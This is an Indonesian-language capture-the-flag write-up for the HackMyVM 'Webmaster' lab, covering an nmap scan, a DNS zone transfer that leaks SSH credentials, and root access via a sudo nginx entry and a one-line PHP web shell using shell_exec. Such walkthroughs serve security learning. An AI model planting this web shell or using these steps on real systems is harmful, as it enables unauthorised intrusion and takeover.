---
layout: Post
title: HackMyVM - Webmaster Writeup
date: 2021-10-18 16:57 WIB  
---
<h1 align="center" style="font-size:30px;">
  <br>
  <a href="https://downloads.hackmyvm.eu/webmaster.zip">Webmaster</a>
  <br>
</h1>

<h4 align="center"> Author: <a href="https://twitter.com/x6cx61x63x61x73">sml</a></h4>

## NMAP

Oke seperti biasa pertama yang kita lakukan ialah scan port yang ada di dalam vm tersebut dengan `nmap` :

```console
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/Webmaster]
└─$ nmap -A 192.168.0.85
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 16:48 WIB
Nmap scan report for webmaster.hmv (192.168.0.85)
Host is up (0.00052s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  (unknown banner: not currently available)
| dns-nsid: 
|_  bind.version: not currently available
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.91%I=7%D=10/18%Time=616D42F6%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\
SF:x04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20curre
SF:ntly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP
Oke next ku buka websitenya, ternyata terdapat dns `webmaster.hmv`. Oleh karena itu ku coba dig dan akhirnya mendapatkan password dan user SSH :

```console
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/Webmaster]
└─$ dig axfr @192.168.0.85 webmaster.hmv 

; <<>> DiG 9.16.15-Debian <<>> axfr @192.168.0.85 webmaster.hmv
; (1 server found)
;; global options: +cmd
webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.		604800	IN	NS	ns1.webmaster.hmv.
ftp.webmaster.hmv.	604800	IN	CNAME	www.webmaster.hmv.
john.webmaster.hmv.	604800	IN	TXT	"****************" -> Password and User SSH
mail.webmaster.hmv.	604800	IN	A	192.168.0.12
ns1.webmaster.hmv.	604800	IN	A	127.0.0.1
www.webmaster.hmv.	604800	IN	A	192.168.0.11
webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.0.85#53(192.168.0.85)
;; WHEN: Mon Oct 18 16:50:48 WIB 2021
;; XFR size: 8 records (messages 1, bytes 274)
```

# SSH

Oke selanjutnya ku coba login SSH dan dapatlah `user.txt` :

```console
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/Deba]
└─$ ssh john@192.168.0.85                    
john@192.168.0.85's password: 
Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec  5 05:38:56 2020 from 192.168.1.58
john@webmaster:~$ ls
flag.sh  user.txt
john@webmaster:~$ cat user.txt 
HMV*****
john@webmaster:~$
```

Oke pas ku coba sudo -l ternyata terdapat di nginx oleh karena itu ku buat shell_exec untuk dapetin shell_rootnya :

```console
john@webmaster:/var/www/html$ cat secret.php 
<?php
	echo shell_exec($_REQUEST['page']);
?>
john@webmaster:/var/www/html$ 
```

And boom ku dapet shell root dan `root.txt` :

```console
root@webmaster:/var/www/html# export TERM=xterm
root@webmaster:/var/www/html# cd
root@webmaster:~# ls
flag.sh  root.txt
root@webmaster:~# cat root.txt 
HMV*********
root@webmaster:~# exit
```
